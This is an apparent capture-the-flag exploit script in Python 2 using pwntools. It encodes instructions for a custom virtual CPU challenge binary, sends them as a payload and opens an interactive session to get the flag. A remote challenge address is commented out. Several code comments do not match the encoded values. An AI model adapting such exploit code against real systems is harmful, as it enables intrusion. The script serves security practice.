#!/usr/bin/python

from pwn import *
import time

def make(op, a1,a2,a3, a4=0):
  print hex(op<<27+a1<<24+a2<<20+a3<<16+a4)
  return p32((op<<27)+(a1<<24)+(a2<<20)+(a3<<16)+a4)[::-1].encode('hex').upper()

#s = remote("110.10.147.126", 9091)
s = process("./cpu")
pay = ''

pay += make(0xf, 5, 2, 0, 0x7ffc) # mov r2, 0
pay += make(0xf, 5, 3, 0, 0x100) # mov r3, 4
pay += make(0xf, 5, 8, 0, 2)
pay += make(0x1e, 0, 0, 0, 0)


pay += make(0xf, 5, 2, 0, 0) # mov r2, 0
#pay += make(0xf, 5, 3, 0, 0x100) # mov r3, 4
#pay += make(0xf, 5, 8, 0, 2)
pay += make(0x1e, 0, 0, 0, 0)

#pay += make(0xf, 5, 1, 0, 0)
pay += make(0xf, 5, 8, 0, 1)
pay += make(0x1e, 0, 0, 0, 0)


pay += make(0xf, 3, 1, 0, 0) # mov r1, 0
#pay += make(0xf, 5, 2, 0, 0x10) # mov r2, 0
#pay += make(0xf, 5, 3, 0, 0x100) # mov r3, 4
pay += make(0xf, 5, 8, 0, 2)
pay += make(0x1e, 0, 0, 0, 0)


pay += make(0xf, 5, 1, 0, 1) # mov r1, 0
#pay += make(0xf, 5, 2, 0, 0x10) # mov r2, 0
#pay += make(0xf, 5, 3, 0, 0x100) # mov r3, 4
pay += make(0xf, 5, 8, 0, 3)
pay += make(0x1e, 0, 0, 0, 0)

print pay
#pause()
time.sleep(0.5)
s.sendline(pay)
time.sleep(1)
s.send("****")
time.sleep(1)
s.send("flag")
s.interactive()
